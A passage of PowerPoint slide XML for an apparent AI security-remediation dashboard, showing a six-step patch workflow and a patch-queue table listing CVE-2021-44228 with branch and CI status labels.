          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="TextBox 32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9848088" y="2679192"/>
            <a:ext cx="1975104" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Human approval needed</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Rectangle 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="297180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08376"/>
            <a:ext cx="11731752" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  6-Step Automated Remediation Workflow</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Rectangle 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3246120"/>
            <a:ext cx="1920240" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1F0E0E"/>
          </a:solidFill>
          <a:ln w="889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3291840"/>
            <a:ext cx="1920240" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="950" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1. Detect</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="TextBox 37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3584448"/>
            <a:ext cx="1737360" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE confirmed exploitable in sandbox simulation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2148840" y="3547872"/>
            <a:ext cx="64008" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1E283C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>→</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Rectangle 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2212848" y="3246120"/>
            <a:ext cx="1920240" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1F1704"/>
          </a:solidFill>
          <a:ln w="889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212848" y="3291840"/>
            <a:ext cx="1920240" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="950" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2. Analyse</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="TextBox 41"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2304288" y="3584448"/>
            <a:ext cx="1737360" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>AI reads affected component source code to plan minimal fix</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="TextBox 42"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4133088" y="3547872"/>
            <a:ext cx="64008" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1E283C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>→</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="Rectangle 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4197096" y="3246120"/>
            <a:ext cx="1920240" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1F1704"/>
          </a:solidFill>
          <a:ln w="889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97096" y="3291840"/>
            <a:ext cx="1920240" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="950" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>3. Generate Fix</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="TextBox 45"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4288536" y="3584448"/>
            <a:ext cx="1737360" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Minimal code change: dep upgrade / config / validation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="TextBox 46"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6117336" y="3547872"/>
            <a:ext cx="64008" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1E283C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>→</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="Rectangle 47"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6181344" y="3246120"/>
            <a:ext cx="1920240" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="07171F"/>
          </a:solidFill>
          <a:ln w="889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81344" y="3291840"/>
            <a:ext cx="1920240" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="950" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4. Open PR</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50" name="TextBox 49"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6272784" y="3584448"/>
            <a:ext cx="1737360" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>GitHub PR with diff, test plan, CVE reference, MITRE context</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="TextBox 50"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8101584" y="3547872"/>
            <a:ext cx="64008" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1E283C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>→</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="Rectangle 51"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8165592" y="3246120"/>
            <a:ext cx="1920240" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="07171F"/>
          </a:solidFill>
          <a:ln w="889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65592" y="3291840"/>
            <a:ext cx="1920240" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="950" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>5. CI Gate</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="TextBox 53"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8257032" y="3584448"/>
            <a:ext cx="1737360" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>All unit, integration and SAST tests must pass</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="55" name="TextBox 54"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10085832" y="3547872"/>
            <a:ext cx="64008" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1E283C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>→</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="56" name="Rectangle 55"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10149840" y="3246120"/>
            <a:ext cx="1920240" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="061A13"/>
          </a:solidFill>
          <a:ln w="889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49840" y="3291840"/>
            <a:ext cx="1920240" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="950" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>6. Re-Simulate</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="58" name="TextBox 57"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10241280" y="3584448"/>
            <a:ext cx="1737360" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Exploit re-runs against patched build. Must return BLOCKED.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="59" name="Rectangle 58"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4233672"/>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28600" y="4270248"/>
            <a:ext cx="11731752" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  Live Patch Queue — GlobalShip Logistics</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="61" name="Rectangle 60"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4507992"/>
            <a:ext cx="1202436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92608" y="4553712"/>
            <a:ext cx="1280160" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="63" name="TextBox 62"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1664208" y="4553712"/>
            <a:ext cx="3977640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>BRANCH NAME</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="64" name="TextBox 63"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5733288" y="4553712"/>
            <a:ext cx="777240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CI STATUS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="65" name="TextBox 64"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6601968" y="4553712"/>
            <a:ext cx="1417320" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>RE-SIMULATION RESULT</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="66" name="TextBox 65"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8110728" y="4553712"/>
            <a:ext cx="960120" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MERGE STATUS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="67" name="TextBox 66"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9162288" y="4553712"/>
            <a:ext cx="777240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>AUTO-MERGED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="68" name="TextBox 67"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10030968" y="4553712"/>
            <a:ext cx="2194560" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CREATED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="69" name="Rectangle 68"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4764024"/>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92608" y="4800600"/>
            <a:ext cx="1280160" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2021-44228</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="71" name="TextBox 70"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1664208" y="4800600"/>
            <a:ext cx="3977640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sentinel/fix/CVE-2021-44228/erpnext-v15/20240114</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="72" name="TextBox 71"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5733288" y="4800600"/>
            <a:ext cx="777240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>RUNNING</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="73" name="TextBox 72"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6601968" y="4800600"/>
            <a:ext cx="1417320" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PENDING — sim not yet run</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="74" name="TextBox 73"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8110728" y="4800600"/>
            <a:ext cx="960120" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OPEN</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="75" name="TextBox 74"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9162288" y="4800600"/>
            <a:ext cx="777240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
